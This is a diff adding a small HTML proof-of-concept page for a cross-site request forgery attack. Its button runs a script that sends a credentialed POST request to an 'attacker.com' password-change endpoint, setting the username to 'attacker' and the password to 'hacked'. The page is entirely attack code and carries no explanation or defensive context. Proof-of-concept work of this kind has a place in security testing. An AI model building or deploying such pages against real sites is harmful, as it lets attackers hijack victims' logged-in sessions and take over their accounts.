@@ -1,0 +1,16 @@
+<html>
+<title>CSRF POC</title>
+<body>
+<center>
+<h1> CSRF POC </h1>
+<script>
+function csrf() {
+fetch('https://attacker.com/changepasswd', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: '{"username": "attacker", "password": "hacked"}'});
+}
+</script>
+<form action="#">
+<input type="button" value="Submit" onclick="return csrf()" />
+</form>
+</center>
+</body>
+</html>
